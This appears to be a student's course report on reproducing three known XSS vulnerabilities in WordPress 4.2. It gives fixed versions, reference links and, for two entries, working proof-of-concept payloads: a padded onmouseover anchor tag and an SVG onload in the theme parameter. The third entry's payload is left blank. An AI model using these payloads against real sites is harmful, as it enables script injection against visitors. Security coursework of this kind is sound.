
# Project 7 - WordPress Pentesting

Time spent: **3** hours spent in total

> Objective: Find, analyze, recreate, and document **three vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Unauthenticated Stored Cross-Site Scripting (XSS)
  - [X] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [X] GIF Walkthrough: ![alt-text][./Unauthorized XSS.gif]
  - [X] Steps to recreate: 
  		a. paste the following code into a post and post it on to the website:

  		`<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`

  - [X] Affected source code:
    - [Link 1](https://wpvulndb.com/vulnerabilities/7945)
1. Authenticated Cross-Site Scripting (XSS)	
  - [X] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.6
  - [X] GIF Walkthrough: ![alt-text][./XSS3.gif]
  - [X] Steps to recreate: 
  		a. Copy and paste the following code into any post and post it on the website:

  		`http://www.test.com/wp-admin/customize.php?theme=<svg onload=alert(2)>`
  - [X] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87)
1. Legacy Theme Preview Cross-Site Scripting (XSS)
  - [X] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.4
  - [X] GIF Walkthrough: ![alt-text][./XSS2.gif]
  - [X] Steps to recreate: 
  		a. Paste the following code into any post and post it on the website
  - [X] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/changeset/33549)

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Setting up vagrant was alittle chanllenging at first but once it was installed it was pretty easy.

## License

    Copyright [2018] [Yuan Zhou]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.